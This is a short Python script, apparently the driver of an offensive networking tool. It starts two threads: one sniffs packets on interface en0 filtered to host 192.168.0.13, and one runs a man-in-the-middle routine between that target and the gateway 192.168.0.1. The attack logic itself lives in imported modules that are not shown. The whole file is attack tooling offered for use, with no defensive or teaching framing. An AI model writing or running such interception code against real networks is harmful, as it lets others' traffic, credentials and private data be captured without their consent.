
from modules.sniff_packets import *
from modules.man_in_the_middle import *
import threading

gateway_ip_addr = "192.168.0.1"
target_ip_addr = "192.168.0.13" 

sniff = threading.Thread(target=sniff_packets, args=("en0", "host 192.168.0.13"))
mitm = threading.Thread(target=man_in_the_middle, args=(target_ip_addr, gateway_ip_addr))

sniff.start()
mitm.start()